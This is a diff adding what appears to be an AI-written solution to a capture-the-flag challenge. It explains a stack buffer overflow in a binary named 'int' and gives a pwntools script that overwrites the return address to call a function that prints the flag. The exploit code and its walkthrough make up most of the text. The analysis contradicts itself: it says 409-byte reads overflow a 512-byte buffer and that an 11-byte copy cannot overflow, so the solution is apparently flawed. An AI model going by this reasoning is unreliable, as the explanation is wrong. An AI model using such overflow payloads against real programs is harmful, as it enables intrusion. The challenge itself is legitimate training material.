@@ -1,0 +1,80 @@
+To solve this challenge using `pwntools`, we need to identify the vulnerabilities and craft an exploit to leverage them. Here's a step-by-step guide and the corresponding code:
+
+### Step-by-Step Guide
+
+1. **Understand the Vulnerabilities:**
+   - The `check_passwd` function checks the length of the password. If the length is between 4 and 8 characters, it copies the password into a fixed-size buffer `dest` of 11 bytes.
+   - The `login` function reads up to 409 bytes for the username and 409 bytes for the password. However, the `check_passwd` function only copies up to 11 bytes into `dest`.
+   - The `what_is_this` function calls `system("cat flag")`, which we want to execute.
+
+2. **Identify the Buffer Overflow:**
+   - The `check_passwd` function does not have any buffer overflow vulnerability since it limits the copy to 11 bytes.
+   - However, the `login` function reads up to 409 bytes for the password, which can be used to overflow the buffer `buf`.
+
+3. **Craft the Exploit:**
+   - We need to overflow the buffer `buf` to overwrite the return address of the `login` function.
+   - We will overwrite the return address with the address of the `what_is_this` function to execute `system("cat flag")`.
+
+### Code to Solve the Challenge
+
+```python
+from pwn import *
+
+# Set up the process
+binary = './int'
+elf = ELF(binary)
+p = process(binary)
+
+# Addresses
+what_is_this_addr = elf.symbols['what_is_this']  # Address of the what_is_this function
+
+# Offsets
+offset = 512 + 4  # 512 bytes for buf + 4 bytes for saved EBP
+
+# Payload
+payload = b'A' * offset  # Fill the buffer and saved EBP
+payload += p32(what_is_this_addr)  # Overwrite the return address with the address of what_is_this
+
+# Interact with the program
+p.recvuntil('Your choice:')
+p.sendline('1')  # Choose login
+p.recvuntil('Please input your username:')
+p.sendline('username')  # Send a dummy username
+p.recvuntil('Please input your passwd:')
+p.sendline(payload)  # Send the payload
+
+# Receive the flag
+flag = p.recvall().decode().strip()
+print(flag)
+```
+
+### Explanation of the Code
+
+1. **Set up the process:**
+   - `binary = './int'`: Path to the binary.
+   - `elf = ELF(binary)`: Load the binary using `pwntools`.
+   - `p = process(binary)`: Start the process.
+
+2. **Addresses:**
+   - `what_is_this_addr = elf.symbols['what_is_this']`: Get the address of the `what_is_this` function.
+
+3. **Offsets:**
+   - `offset = 512 + 4`: Calculate the offset to overwrite the return address. The buffer `buf` is 512 bytes, and we need to account for the saved EBP (4 bytes).
+
+4. **Payload:**
+   - `payload = b'A' * offset`: Fill the buffer and saved EBP with 'A'.
+   - `payload += p32(what_is_this_addr)`: Overwrite the return address with the address of `what_is_this`.
+
+5. **Interact with the program:**
+   - `p.recvuntil('Your choice:')`: Receive data until "Your choice:".
+   - `p.sendline('1')`: Send '1' to choose login.
+   - `p.recvuntil('Please input your username:')`: Receive data until "Please input your username:".
+   - `p.sendline('username')`: Send a dummy username.
+   - `p.recvuntil('Please input your passwd:')`: Receive data until "Please input your passwd:".
+   - `p.sendline(payload)`: Send the payload to overflow the buffer.
+
+6. **Receive the flag:**
+   - `flag = p.recvall().decode().strip()`: Receive all remaining data and decode it to get the flag.
+   - `print(flag)`: Print the flag.
+
+Run this script, and it should print the flag from the `flag` file.
